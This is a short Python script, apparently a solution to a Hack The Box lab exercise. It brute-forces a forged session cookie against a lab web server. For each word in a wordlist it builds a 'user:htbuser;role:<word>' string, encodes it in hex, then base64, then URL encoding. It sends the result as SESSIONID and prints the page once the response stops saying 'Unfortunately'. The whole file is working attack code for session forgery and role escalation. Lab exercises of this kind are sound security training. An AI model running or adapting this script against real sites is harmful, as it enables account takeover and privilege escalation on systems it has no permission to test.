from base64 import b64encode
from binascii import hexlify
import codecs
import requests
import sys 
from time import time
import urllib.parse
import os.path

url = "http://165.22.115.197:30564/question1/"

def codify(cookie):
    # Encode Cookie in HEX
    x_step1 = hexlify(cookie.encode()).decode()

    # Encode Cookie in base64
    x_step2 = b64encode(x_step1.encode()).decode()

    # Encode Cookie for URL
    x_step3 = urllib.parse.quote(x_step2, safe='')

    # Format Cookie
    final_cookie = { "SESSIONID": x_step3}

    return final_cookie

def build_plaintext(word):
    return "user:htbuser;role:" + word + ";time:1681318076"

def unpack(line):
    word = line
    return word

def main():
    
    # check if wordlist has been given and exists
    if (len(sys.argv) > 1) and (os.path.isfile(sys.argv[1])):
        wordlist = sys.argv[1]
    else:
        print("[!] Please check wordlist.")
        print("[-] Usage: python3 {} /path/to/wordlist".format(sys.argv[0]))
        sys.exit()

    # Open the wordlist 
    with open(wordlist) as wl:
        for word in wl:
            input_word = unpack(word.rstrip())
            print("[-] Checking word {}".format(input_word))
            plaintext_cookie = build_plaintext(input_word)
            encoded_cookie = codify(plaintext_cookie)
            res = requests.get(url, cookies=encoded_cookie)

            if not 'Unfortunately' in res.text:
                print(res.text)
                sys.exit()

main()